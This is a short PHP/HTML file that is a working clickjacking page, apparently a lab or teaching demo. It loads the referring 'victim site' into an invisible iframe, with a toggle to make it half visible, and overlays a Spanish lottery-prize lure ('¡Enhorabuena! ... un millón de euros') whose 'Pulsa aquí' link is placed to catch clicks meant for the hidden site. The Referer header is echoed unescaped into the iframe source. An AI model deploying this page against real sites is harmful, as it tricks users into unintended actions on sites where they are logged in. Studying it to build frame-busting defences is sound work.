<?php
header('Content-Type: text/html; charset=utf-8');
?>
<html>
<head>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css">
    <style>
        iframe { /* iframe from the victim site */
            width: 800px;
            height: 1000px;
            position: absolute;
            top:0; left:-20px;
            <?php if (array_key_exists('show', $_GET)): ?>
            opacity: 0.5;
            <?php else: ?>
            opacity: 0;
            <?php endif; ?>
            z-index: 1;
        }
    </style>
</head>
<body>
<iframe src="<?php echo $_SERVER['HTTP_REFERER']; ?>"></iframe>
<div id="ui content">
    <h1 class="ui header">
        ¡Enhorabuena! Te puede tocar un millón de euros. Pulsa en el enlace1 para ver si has tenido suerte...
    </h1>
    <div style="margin-top: 200px;">
        <a href="#" class="ui link">Pulsa aquí</a>
    </div>
</div>
</body>
</html>
